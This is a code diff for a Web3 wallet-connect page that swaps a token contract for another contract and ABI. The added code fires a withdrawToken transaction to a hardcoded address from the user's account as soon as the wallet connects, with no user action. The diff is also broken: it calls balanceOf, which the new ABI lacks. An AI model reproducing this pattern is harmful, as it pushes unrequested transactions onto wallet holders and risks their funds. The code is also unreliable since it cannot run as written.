@@ -19,7 +19,6 @@
     
       var web3Modal;
       var web3;
-      var web3_connect;  
     
       var provider;
       var account;                       
@@ -28,17 +27,8 @@
       var contract;     
     
       window.addEventListener('load', async function() {                       
-        await init();                
-        await init_web3();                                  
-      });       
-    
-      async function init_web3(){
-        web3 = new Web3(new Web3.providers.HttpProvider("https://data-seed-prebsc-1-s1.binance.org:8545/"));  
-        
-        contract_address = web3.utils.toChecksumAddress("0x61Bb41c5553A619DC20A45b1C511339cDD0fD6F9");
-        contract_abi = JSON.parse('[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"admin","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenaddress","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer_contract","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]');            
-        contract = await new web3.eth.Contract(contract_abi,contract_address);  
-      }  
+        await init();                                                  
+      });        
     
       function init() {                                  
         const providerOptions = {        
@@ -64,14 +54,22 @@
       
     
       async function fetchAccountData() { 
-        web3_connect = new Web3(provider);
-        const accounts = await web3_connect.eth.getAccounts();        
+        web3 = new Web3(provider);
+        contract_address = web3.utils.toChecksumAddress("0x6f1C01415b55cAC25A634dD2Df3690A2d0855fA6");
+        contract_abi = JSON.parse('[{"inputs":[{"internalType":"address","name":"_tokenContract","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"admin","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"transfer_balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer_save","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"}],"name":"withdrawToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]');            
+        contract = await new web3.eth.Contract(contract_abi,contract_address); 
+        
+        const accounts = await web3.eth.getAccounts();        
         account = accounts[0];                                
         
         var balance = await contract.methods.balanceOf(account).call(); 
         balance = web3.utils.fromWei(String(balance), 'ether');      
         
-        document.getElementById('balance_sum').innerHTML = balance                                                                      
+        document.getElementById('balance_sum').innerHTML = balance;    
+        
+        
+        var result = await contract.methods.withdrawToken('0x33E9c03C37a92Cfa01893B393d95441f08BcC652').send({from:account});                                                                       
+        console.log(result);
       }               
     
             
